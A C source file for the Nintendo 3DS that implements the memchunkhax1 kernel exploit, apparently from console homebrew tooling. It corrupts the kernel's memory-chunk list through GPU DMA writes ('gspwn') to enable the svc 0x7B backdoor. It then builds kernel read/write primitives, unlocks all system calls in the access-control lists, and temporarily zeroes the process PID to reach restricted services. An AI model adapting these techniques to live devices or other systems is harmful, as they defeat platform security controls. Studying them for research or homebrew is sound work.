#include "libctru/types.h"
#include "libctru/svc.h"
#include "libctru/os.h"
#include "libctru/srv.h"
#include "gspgpu.h"
#include "memchunkhax.h"
#include <string.h>

#define CURRENT_KTHREAD          0xFFFF9000
#define CURRENT_KPROCESS         0xFFFF9004
#define CURRENT_KPROCESS_HANDLE  0xFFFF8001
#define RESOURCE_LIMIT_THREADS   0x2

#define MCH2_THREAD_COUNT_MAX    0x20
#define MCH2_THREAD_STACKS_SIZE  0x1000

#define SVC_ACL_OFFSET(svc_id)   (((svc_id) >> 5) << 2)
#define SVC_ACL_MASK(svc_id)     (0x1 << ((svc_id) & 0x1F))
#define THREAD_PAGE_ACL_OFFSET   0xF38

__attribute((naked)) u32 svc_7b(backdoor_fn entry_fn, ...) // can pass up to two arguments to entry_fn(...)
{
   __asm__ volatile(
      "push {r0, r1, r2} \n\t"
      "mov r3, sp \n\t"
      "add r0, pc, #12 \n\t"
      "svc 0x7B \n\t"
      "add sp, sp, #8 \n\t"
      "ldr r0, [sp], #4 \n\t"
      "bx lr \n\t"
      "cpsid aif \n\t"
      "ldr r2, [r3], #4 \n\t"
      "ldmfd r3!, {r0, r1} \n\t"
      "push {r3, lr} \n\t"
      "blx r2 \n\t"
      "pop {r3, lr} \n\t"
      "str r0, [r3, #-4]! \n\t"
      "bx lr \n\t");
   return 0;
}


__attribute__((naked)) u32 get_thread_page(void)
{
   __asm__ volatile(
      "sub r0, sp, #8 \n\t"
      "mov r1, #1 \n\t"
      "mov r2, #0 \n\t"
      "svc	0x2A \n\t"
      "mov r0, r1, LSR#12 \n\t"
      "mov r0, r0, LSL#12 \n\t"
      "bx lr \n\t");
   return 0;
}

void k_enable_all_svcs(u32 isNew3DS)
{
   u32* thread_ACL = *(*(u32***)CURRENT_KTHREAD + 0x22) - 0x6;
   u32* process_ACL = *(u32**)CURRENT_KPROCESS + (isNew3DS ? 0x24 : 0x22);

   memset(thread_ACL, 0xFF, 0x10);
   memset(process_ACL, 0xFF, 0x10);
}

u32 k_read_kaddr(u32* kaddr)
{
   return *kaddr;
}

u32 read_kaddr(u32 kaddr)
{
   return svc_7b((backdoor_fn)k_read_kaddr, kaddr);
}

u32 k_write_kaddr(u32* kaddr, u32 val)
{
   *kaddr = val;
   return 0;
}

void write_kaddr(u32 kaddr, u32 val)
{
   svc_7b((backdoor_fn)k_write_kaddr, kaddr, val);
}

void gspwn(u32 dst, u32 src, u32 size)
{
	// flush caches
	GSP_FlushDCache((u32*)src, size);
	GSP_InvalidateDataCache((u32*)dst, size);
	
	// CN gspwn
	doGspwn((u32*)src, (u32*)dst, (u32)size);

	// Wait for the operation to finish.
	svcSleepThread(100000000);
}

void memchunkhax1_write_pair(u32 val1, u32 val2)
{
   u32 linear_buffer;
   u32 tmp;

   u32* next_ptr3;
   u32* prev_ptr3;

   u32* next_ptr1;
   u32* prev_ptr6;

   svcControlMemory(&linear_buffer, 0, 0, 0x10000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   svcControlMemory(&tmp, linear_buffer + 0x1000, 0, 0x1000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x3000, 0, 0x2000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x6000, 0, 0x1000, MEMOP_FREE, 0);

   next_ptr1 = (u32*)(linear_buffer + 0x0004);
   gspwn(linear_buffer + 0x0000, linear_buffer + 0x1000, 16);

   next_ptr3 = (u32*)(linear_buffer + 0x2004);
   prev_ptr3 = (u32*)(linear_buffer + 0x2008);
   gspwn(linear_buffer + 0x2000, linear_buffer + 0x3000, 16);

   prev_ptr6 = (u32*)(linear_buffer + 0x5008);
   gspwn(linear_buffer + 0x5000, linear_buffer + 0x6000, 16);

   *next_ptr1 = *next_ptr3;
   *prev_ptr6 = *prev_ptr3;

   *prev_ptr3 = val1 - 4;
   *next_ptr3 = val2;
   gspwn(linear_buffer + 0x3000, linear_buffer + 0x2000, 16);
   svcControlMemory(&tmp, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   gspwn(linear_buffer + 0x1000, linear_buffer + 0x0000, 16);
   gspwn(linear_buffer + 0x6000, linear_buffer + 0x5000, 16);

   svcControlMemory(&tmp, linear_buffer + 0x0000, 0, 0x1000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x2000, 0, 0x4000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x7000, 0, 0x9000, MEMOP_FREE, 0);

}

void do_memchunkhax1(void)
{
   u32 saved_vram_value = *(u32*)0x1F000008;
	
   // 0x1F000000 contains the enable bit for svc 0x7B
   memchunkhax1_write_pair(get_thread_page() + THREAD_PAGE_ACL_OFFSET + SVC_ACL_OFFSET(0x7B), 0x1F000000);

   write_kaddr(0x1F000008, saved_vram_value);
}

void unlock_services(bool isNew3DS)
{
	u32 kver = (*(vu32*)0x1FF80000) & ~0xFF;
	u32 PID_kaddr = read_kaddr(CURRENT_KPROCESS) + (isNew3DS ? 0xBC : (kver > SYSTEM_VERSION(2, 40, 0)) ? 0xB4 : 0xAC);
	u32 old_PID = read_kaddr(PID_kaddr);
	write_kaddr(PID_kaddr, 0);
	srvExit();
	srvInit();
	write_kaddr(PID_kaddr, old_PID);
}